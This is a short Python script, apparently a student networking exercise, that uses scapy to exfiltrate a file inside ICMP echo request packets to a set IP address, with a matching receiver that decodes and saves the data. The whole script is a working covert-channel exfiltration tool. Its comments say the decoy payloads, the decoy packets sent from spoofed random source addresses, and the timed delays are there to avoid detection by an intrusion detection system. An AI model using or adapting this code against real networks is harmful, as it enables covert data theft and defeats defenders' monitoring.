import random
import socket
import string
import struct
import time
from scapy.all import IP, ICMP, send, sniff
import base64

def send_file_in_icmp_request(file_path: str, ip_address: str):
    #Fake message
    corrupt = base64.b64encode("this is the fake message".encode('utf-8'))

    # Read the file contents
    with open(file_path, "rb") as f:
        file_contents = f.read()

    # Create an ICMP echo request packet with the file contents
    # encode the file content
    file_contents = base64.b64encode(file_contents)
    # Add a fake message at the end of the file to make it more difficult to detect
    file_contents = file_contents + b'P4s' + corrupt
    #real_icmp_packet = IP(dst=ip_address, src = f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}"+".200") / ICMP() / base64.b64encode(file_contents)
    real_icmp_packet = IP(dst=ip_address) / ICMP() / base64.b64encode(file_contents)

    # send false icmp packets with randomized source ip
    ip_address = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    fake_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 199)}") / ICMP() / base64.b64encode(corrupt)
    #send fake icmp packets with the real one
    n = random.randint(0,5)
    for i in range(0,5):
        if i == n:
            send(real_icmp_packet)
            print("n = ", n)
        else:
            send(fake_icmp_packet)
        # delay between each packet to avoid detection by the IDS
        time.sleep(0.5)

def decode_icmp_response(packet):
    if ICMP in packet and packet[ICMP].type == 8 and packet[IP].src.endswith("200"):
        file_contents = packet[ICMP].load
        # Remove the fake message at the end of the file
        file_contents = file_contents.split(b"P4s")[0]
        decoded_contents = base64.b64decode(file_contents)
        print("Received ICMP response:")
        print(decoded_contents.decode())
        # Save the file
        with open("received_file.txt", "wb") as received_file:
            received_file.write(decoded_contents)
            print("File saved as received_file.txt")

# Example usage
if __name__ == "__main__":
    file_path = "C:\\Users\\ayoub\\OneDrive\\Documents\\UBS\\A1\\Réseau\\Exfiltration_ICMP\\test2.txt"
    target_ip = "192.168.38.242"  # Replace with the target IP address
    send_file_in_icmp_request(file_path, target_ip)
    # Listen for ICMP responses for 30 seconds
    #sniff(filter=f"icmp and host {target_ip}", prn=decode_icmp_response, timeout=30)